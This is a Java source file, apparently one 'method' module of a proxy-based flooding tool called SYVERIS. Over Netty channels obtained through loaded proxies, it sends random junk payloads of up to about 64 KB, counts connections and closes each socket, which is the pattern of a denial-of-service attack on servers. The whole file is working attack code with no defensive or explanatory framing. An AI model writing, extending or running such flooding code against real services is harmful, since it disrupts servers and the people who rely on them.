package IO.SYVERIS.methods;

import IO.SYVERIS.utils.NettyBootstrap;
import IO.SYVERIS.utils.ProxyLoader;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelOption;
import java.security.SecureRandom;

public class RandomBytes implements Method {
   private static final SecureRandom RANDOM = new SecureRandom();

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      byte[] bytes = new byte[5 + RANDOM.nextInt(65534)];
      RANDOM.nextBytes(bytes);
      channel.writeAndFlush(Unpooled.buffer().writeBytes(bytes));
      bytes = null;
      ++NettyBootstrap.integer;
      ++NettyBootstrap.totalConnections;
      if (RANDOM.nextBoolean()) {
         channel.config().setOption(ChannelOption.SO_LINGER, 1);
      }

      channel.close();
   }
}
